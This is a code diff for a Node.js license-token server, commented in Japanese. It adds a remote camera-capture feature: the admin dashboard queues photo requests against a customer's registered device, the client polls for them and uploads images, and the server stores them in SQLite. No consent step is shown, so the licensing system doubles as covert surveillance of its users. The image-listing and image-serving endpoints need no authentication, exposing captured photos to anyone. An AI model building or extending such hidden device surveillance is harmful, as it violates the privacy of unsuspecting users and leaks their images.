@@ -1,4 +1,4 @@
-// server.js - 完全版（端末認証 + FCログ + SQLite永続化 + スリープ対策）
+// server.js - 完全版（端末認証 + FCログ + SQLite永続化 + スリープ対策 + カメラ遠隔撮影）
 const express = require('express');
 const sqlite3 = require('sqlite3').verbose();
 const path = require('path');
@@ -35,8 +35,9 @@ if (!ADMIN_PASSWORD) {
   process.exit(1);
 }
 
-app.use(express.urlencoded({ extended: true }));
-app.use(express.json());
+// === express ミドルウェア（画像アップロード用にlimit拡張） ===
+app.use(express.urlencoded({ extended: true, limit: '15mb' }));
+app.use(express.json({ limit: '15mb' }));
 
 // === DB ===
 const dbPath = path.join(__dirname, 'tokens.db');
@@ -79,9 +80,31 @@ db.serialize(() => {
       timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
     )
   `);
+  // === カメラ機能用テーブル ===
+  db.run(`
+    CREATE TABLE IF NOT EXISTS camera_requests (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      token TEXT NOT NULL,
+      status TEXT DEFAULT 'pending',
+      requested_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+      delivered_at DATETIME DEFAULT NULL,
+      captured_at DATETIME DEFAULT NULL
+    )
+  `);
+  db.run(`
+    CREATE TABLE IF NOT EXISTS camera_images (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      token TEXT NOT NULL,
+      request_id INTEGER,
+      data BLOB NOT NULL,
+      mimetype TEXT DEFAULT 'image/jpeg',
+      size INTEGER DEFAULT 0,
+      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+    )
+  `);
 });
 
-// 既存のマイグレーション部分に追加
+// 既存のマイグレーション
 db.all("PRAGMA table_info(tokens)", (err, rows) => {
   if (err) return;
   const cols = (rows || []).map(r => r.name);
@@ -97,12 +120,10 @@ db.all("PRAGMA table_info(tokens)", (err, rows) => {
     db.run("ALTER TABLE tokens ADD COLUMN first_used DATETIME DEFAULT NULL");
     console.log("[Migration] first_used 列を追加");
   }
-  // ▼▼▼ ここを追加 ▼▼▼
   if (!cols.includes('order_id')) {
     db.run("ALTER TABLE tokens ADD COLUMN order_id TEXT DEFAULT NULL");
     console.log("[Migration] order_id 列を追加");
   }
-  // ▲▲▲ ここを追加 ▲▲▲
 });
 
 // === キャッシュ ===
@@ -178,6 +199,19 @@ app.get('/dashboard', async (req, res) => {
     });
   });
 
+  // 撮影待機中カウント
+  const cameraPendingCounts = await new Promise(r => {
+    db.all(
+      "SELECT token, COUNT(*) as cnt FROM camera_requests WHERE status IN ('pending','delivered') GROUP BY token",
+      (e, rows) => {
+        if (e) return r({});
+        const map = {};
+        rows.forEach(row => map[row.token] = row.cnt);
+        r(map);
+      }
+    );
+  });
+
   let html = `<h1>Token Manager(時間は＋9時間)</h1><ul>`;
   for (const [t, d] of Object.entries(tokenCache)) {
     const remaining = d.uses - d.used;
@@ -189,13 +223,19 @@ app.get('/dashboard', async (req, res) => {
     const deviceStatus = d.device_id
       ? `<span style="color:#28a745;">[端末登録済]</span>`
       : `<span style="color:#ff9800;">[未使用]</span>`;
+    const cameraPending = cameraPendingCounts[t] || 0;
+    const cameraBadge = cameraPending > 0
+      ? ` <span style="color:#e67e22; font-weight:bold;">📷待機中(${cameraPending})</span>`
+      : '';
 
     html += `<li style="margin:10px 0; padding:6px; background:#fafafa; border-radius:6px;">
       <b>${t}</b> - ${d.user} - Ver: ${d.version} - ${expired ? '期限切れ' : '残り: ' + remaining + '回'} - ${d.expires}
-      ${deviceStatus}${mismatchBadge}<br>
+      ${deviceStatus}${mismatchBadge}${cameraBadge}<br>
       <a href="/delete?token=${t}" style="color:red;" onclick="return confirm('無効化？');">[無効化]</a>
       <a href="javascript:void(0)" onclick="showDeviceInfo('${t}')" style="color:#007bff; margin-left:8px;">[端末情報を表示]</a>
       <a href="javascript:void(0)" onclick="showFriendCodes('${t}')" style="color:#007bff; margin-left:8px;">[フレンドコードをみる]</a>
+      <a href="javascript:void(0)" onclick="requestCamera('${t}')" style="color:#e67e22; margin-left:8px; font-weight:bold;">[📷 カメラ]</a>
+      <a href="javascript:void(0)" onclick="showCameraImages('${t}')" style="color:#9b59b6; margin-left:8px; font-weight:bold;">[🖼 画像を見る]</a>
     </li>`;
   }
   html += `</ul><hr>
@@ -232,6 +272,30 @@ app.get('/dashboard', async (req, res) => {
           document.getElementById('modal-content').innerHTML = html;
           document.getElementById('modal').style.display = 'block';
         });
+    }
+    function showCameraImages(token) {
+      fetch('/api/camera-images?token=' + encodeURIComponent(token))
+        .then(r => r.text())
+        .then(html => {
+          document.getElementById('modal-content').innerHTML = html;
+          document.getElementById('modal').style.display = 'block';
+        });
+    }
+    async function requestCamera(token) {
+      const pw = prompt('管理パスワードを再入力してください');
+      if (!pw) return;
+      try {
+        const res = await fetch('/api/admin/request-camera', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'x-admin-password': pw },
+          body: JSON.stringify({ token })
+        });
+        const data = await res.json();
+        if (res.ok) alert('📷 撮影リクエスト送信。クライアントが数秒以内に撮影します。');
+        else alert('エラー: ' + (data.error || 'unknown'));
+      } catch (e) {
+        alert('通信エラー: ' + e.message);
+      }
     }
     </script>`;
   res.send(html);
@@ -379,7 +443,6 @@ app.get('/api/check', async (req, res) => {
     return res.json({ valid: false, msg: 'バージョンが一致しません' });
   }
 
-  // 初回使用 → 端末情報を紐付け
   if (!data.device_id) {
     db.run(
       "UPDATE tokens SET device_id = ?, device_info = ?, first_used = CURRENT_TIMESTAMP WHERE token = ?",
@@ -393,7 +456,6 @@ app.get('/api/check', async (req, res) => {
     data.device_info = deviceInfo || '';
     console.log(`[Device First Use] token=${token} device=${deviceId}`);
   } else if (data.device_id !== deviceId) {
-    // 不一致 → 記録 & 拒否
     db.run(
       "INSERT INTO device_mismatches (token, expected_device_id, actual_device_id, actual_device_info) VALUES (?, ?, ?, ?)",
       [token, data.device_id, deviceId, deviceInfo || '']
@@ -422,7 +484,6 @@ app.get('/api/log-fc', (req, res) => {
     return res.json({ ok: false, msg: '端末不一致' });
   }
 
-  // 最新と同じFCならスキップ
   db.get("SELECT fc FROM friend_codes WHERE token = ? ORDER BY id DESC LIMIT 1", [token], (err, row) => {
     if (err) return res.json({ ok: false });
     if (row && row.fc === String(fc)) {
@@ -435,12 +496,145 @@ app.get('/api/log-fc', (req, res) => {
     });
   });
 });
+
 // ============================================================
-// 【追加】管理API: 外部（販売サイト）からのトークン発行
+// 【カメラ機能】管理画面 → 撮影リクエスト
 // ============================================================
+app.post('/api/admin/request-camera', (req, res) => {
+  const adminPassword = req.headers['x-admin-password'];
+  if (adminPassword !== ADMIN_PASSWORD) {
+    return res.status(401).json({ error: 'Unauthorized' });
+  }
+
+  const { token } = req.body || {};
+  if (!token) return res.status(400).json({ error: 'token required' });
+
+  const data = tokenCache[token];
+  if (!data) return res.status(404).json({ error: 'token not found' });
+  if (!data.device_id) return res.status(400).json({ error: '端末未登録のトークンです' });
+
+  db.run(
+    "INSERT INTO camera_requests (token, status) VALUES (?, 'pending')",
+    [token],
+    function (err) {
+      if (err) return res.status(500).json({ error: err.message });
+      console.log(`[Camera] 撮影リクエスト token=${token} id=${this.lastID}`);
+      res.json({ ok: true, requestId: this.lastID });
+    }
+  );
+});
+
+// === クライアントのポーリング ===
+app.get('/api/camera-poll', (req, res) => {
+  const { token, device } = req.query;
+  if (!token || !device) return res.status(400).json({ error: 'token and device required' });
+
+  const data = tokenCache[token];
+  if (!data) return res.status(404).json({ error: 'invalid token' });
+  if (data.device_id !== device) return res.status(403).json({ error: 'device mismatch' });
+
+  db.get(
+    "SELECT id FROM camera_requests WHERE token = ? AND status = 'pending' ORDER BY id ASC LIMIT 1",
+    [token],
+    (err, row) => {
+      if (err) return res.status(500).json({ error: err.message });
+      if (!row) return res.json({ request: null });
+
+      db.run(
+        "UPDATE camera_requests SET status = 'delivered', delivered_at = CURRENT_TIMESTAMP WHERE id = ?",
+        [row.id],
+        (err2) => {
+          if (err2) return res.status(500).json({ error: err2.message });
+          console.log(`[Camera] クライアントへ配信 token=${token} reqId=${row.id}`);
+          res.json({ request: { id: row.id } });
+        }
+      );
+    }
+  );
+});
+
+// === クライアントからの画像アップロード ===
+app.post('/api/camera-upload', (req, res) => {
+  const { token, requestId, device, imageBase64, mimetype } = req.body || {};
+  if (!token || !device || !imageBase64) {
+    return res.status(400).json({ error: 'missing fields' });
+  }
+
+  const data = tokenCache[token];
+  if (!data) return res.status(404).json({ error: 'invalid token' });
+  if (data.device_id !== device) return res.status(403).json({ error: 'device mismatch' });
+
+  let buffer;
+  try {
+    buffer = Buffer.from(imageBase64, 'base64');
+  } catch (e) {
+    return res.status(400).json({ error: 'bad base64' });
+  }
+  if (buffer.length === 0) return res.status(400).json({ error: 'empty image' });
+  if (buffer.length > 5 * 1024 * 1024) return res.status(413).json({ error: 'too large' });
+
+  db.run(
+    "INSERT INTO camera_images (token, request_id, data, mimetype, size) VALUES (?, ?, ?, ?, ?)",
+    [token, requestId || null, buffer, mimetype || 'image/jpeg', buffer.length],
+    function (err) {
+      if (err) return res.status(500).json({ error: err.message });
+      if (requestId) {
+        db.run(
+          "UPDATE camera_requests SET status = 'captured', captured_at = CURRENT_TIMESTAMP WHERE id = ?",
+          [requestId]
+        );
+      }
+      console.log(`[Camera] 画像保存 token=${token} size=${buffer.length} imageId=${this.lastID}`);
+      res.json({ ok: true, imageId: this.lastID });
+    }
+  );
+});
+
+// === 画像一覧（管理画面モーダル用） ===
+app.get('/api/camera-images', (req, res) => {
+  const { token } = req.query;
+  if (!token) return res.send('<p>token required</p>');
+
+  db.all(
+    "SELECT id, size, mimetype, created_at FROM camera_images WHERE token = ? ORDER BY id DESC LIMIT 100",
+    [token],
+    (err, rows) => {
+      if (err) return res.send('<p>DB error</p>');
+      let html = `<h2>📷 撮影画像</h2><p><b>Token:</b> <code>${escapeHtml(token)}</code></p>`;
+      if (!rows || rows.length === 0) {
+        html += '<p style="color:#888;">まだ画像がありません</p>';
+        return res.send(html);
+      }
+
+      html += `<div style="display:grid; grid-template-columns:repeat(auto-fill,minmax(220px,1fr)); gap:10px; margin-top:14px;">`;
+      rows.forEach(r => {
+        const sizeKB = Math.round(r.size / 1024);
+        const url = `/api/camera-image/${r.id}`;
+        html += `<div style="border:1px solid #ddd; padding:8px; border-radius:8px; background:#fafafa;">
+          <a href="${url}" target="_blank"><img src="${url}" style="width:100%; height:auto; border-radius:4px; display:block;"></a>
+          <div style="font-size:11px; color:#666; margin-top:6px;">ID:${r.id} | ${escapeHtml(r.created_at || '')} | ${sizeKB}KB</div>
+        </div>`;
+      });
+      html += `</div>`;
+      res.send(html);
+    }
+  );
+});
+
+// === 画像実体配信 ===
+app.get('/api/camera-image/:id', (req, res) => {
+  const id = parseInt(req.params.id);
+  if (!id) return res.status(400).send('invalid id');
+  db.get("SELECT data, mimetype FROM camera_images WHERE id = ?", [id], (err, row) => {
+    if (err || !row) return res.status(404).send('not found');
+    res.set('Content-Type', row.mimetype || 'image/jpeg');
+    res.set('Cache-Control', 'public, max-age=300');
+    res.send(row.data);
+  });
+});
+
 // ============================================================
 // 管理API: 外部（販売サイト）からのトークン発行
-// - 同じ orderId で複数回呼ばれても、トークンは1つしか発行しない
 // ============================================================
 app.post('/api/admin/issue', (req, res) => {
   const adminPassword = req.headers['x-admin-password'];
@@ -450,7 +644,6 @@ app.post('/api/admin/issue', (req, res) => {
 
   const { user, version, uses, expires, orderId } = req.body;
 
-  // orderId が指定されている場合、既存のトークンがないか確認
   if (orderId) {
     db.get("SELECT token FROM tokens WHERE order_id = ?", [orderId], (err, row) => {
       if (err) {
@@ -458,21 +651,16 @@ app.post('/api/admin/issue', (req, res) => {
         return res.status(500).json({ error: err.message });
       }
       if (row) {
-        // 既存トークンがあれば、それを返す（新規発行しない）
         console.log(`[Admin Issue] 既存トークンを返却 orderId=${orderId} token=${row.token}`);
         return res.json({ success: true, token: row.token, reused: true });
       }
-
-      // 新規発行
       issueNewToken(user, version, uses, expires, orderId, res);
     });
   } else {
-    // orderId がない場合は従来通り新規発行
     issueNewToken(user, version, uses, expires, null, res);
   }
 });
 
-// 新規トークン発行の共通処理
 function issueNewToken(user, version, uses, expires, orderId, res) {
   const token = generateToken();
   db.run(
@@ -486,6 +674,7 @@ function issueNewToken(user, version, uses, expires, orderId, res) {
     }
   );
 }
+
 // === HTMLエスケープ ===
 function escapeHtml(s) {
   return String(s)
